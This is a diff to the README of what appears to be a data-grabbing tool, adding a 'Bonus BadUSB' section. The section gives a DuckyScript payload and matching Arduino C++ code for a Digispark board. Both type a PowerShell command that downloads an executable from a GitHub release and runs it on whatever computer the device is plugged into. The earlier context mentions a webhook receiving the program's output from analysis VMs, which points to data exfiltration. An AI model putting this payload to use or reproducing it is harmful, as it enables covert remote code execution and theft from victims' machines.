@@ -102,3 +102,54 @@ This data comes from a Virustotal virtual machine that checks and analyzes the b
 Here is the message we receive from the webhook after the program is launched on one of these virtual machines:
 
 ![demo.png](demo.png)
+
+
+### Bonus BadUSB
+
+__Digispark Rev.3 Kickstarter with Attiny85 and USB compatible with Arduino__
+
+  You can buy it [here](https://www.az-delivery.de/en/products/digispark-board).
+
+> DuckyScript
+
+```
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell -command "(New-Object Net.WebClient).DownloadFile('https://github.com/julesgrc0/ADR/releases/download/0.0.3/bADR.exe','%userprofile%\bADR.exe');(New-Object -com shell.application).shellexecute('%userprofile%\bADR.exe');exit"
+ENTER
+```
+
+> Arduino C/C++ Code
+
+```cpp
+#include "Keyboard.h"
+
+void typeKey(uint8_t key)
+{
+  Keyboard.press(key);
+  delay(50);
+  Keyboard.release(key);
+}
+
+
+void setup()
+{
+  Keyboard.begin();
+  delay(500);
+
+  delay(1000);
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+
+  delay(200);
+  Keyboard.print(F("powershell -command \"(New-Object Net.WebClient).DownloadFile('https://github.com/julesgrc0/ADR/releases/download/0.0.3/bADR.exe','%userprofile%\\bADR.exe');(New-Object -com shell.application).shellexecute('%userprofile%\\bADR.exe');exit\""));
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.end();
+}
+
+void loop() {}
+```
